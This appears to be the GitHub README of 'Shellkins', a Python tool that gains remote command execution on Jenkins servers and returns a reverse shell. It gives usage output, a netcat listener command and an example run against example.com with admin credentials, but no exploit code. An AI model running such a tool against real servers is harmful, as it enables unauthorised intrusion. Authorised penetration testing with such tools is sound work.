# Shellkins 
<p align="center">
<a href="#license"><img src="resources/images/logo.png"></a>
</p>

[![xiosec - Shellkins](https://img.shields.io/static/v1?label=xiosec&message=Shellkins&color=blue&logo=github)](https://github.com/xiosec/Shellkins)
[![stars - Shellkins](https://img.shields.io/github/stars/xiosec/Shellkins?style=social)](https://github.com/xiosec/Shellkins)
[![forks - Shellkins](https://img.shields.io/github/forks/xiosec/Shellkins?style=social)](https://github.com/xiosec/Shellkins) [![GitHub release](https://img.shields.io/github/release/xiosec/Shellkins?include_prereleases=&sort=semver)](https://github.com/xiosec/Shellkins/releases/)
[![License](https://img.shields.io/badge/License-MIT-blue)](#license)
[![issues - Shellkins](https://img.shields.io/github/issues/xiosec/Shellkins)](https://github.com/xiosec/Shellkins/issues)

[Jenkins](https://en.wikipedia.org/wiki/Jenkins_(software)) Remote Command Execution
> Jenkins is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery.

## Usage
```
$ python3 shellkins.py --help
```
```
usage: shellkins.py [-h] [--host HOST] [-u USER] [-p PASS] [--lhost LHOST] [--lport LPORT]

Jenkins Remote Command Execution
github : https://github.com/xiosec/Shellkins
by xiosec

optional arguments:
  -h, --help            show this help message and exit
  --host HOST           jenkins host address
  -u USER, --user USER  jenkins account username
  -p PASS, --pass PASS  jenkins account password
  --lhost LHOST         local listener address
  --lport LPORT         local listener port
```

## Example

Clone this repository
```
$ git clone https://github.com/xiosec/Shellkins.git
```
Run a listener (on your machine)
```
$ nc -nlvp 1234
```
Run the script
```
$ python3 shellkins.py --host http://example.com:8080/ --user admin --pass admin --lhost 127.0.0.1 --lport 1234
```

## License

Released under [MIT](/LICENSE) by [@xiosec](https://github.com/xiosec).
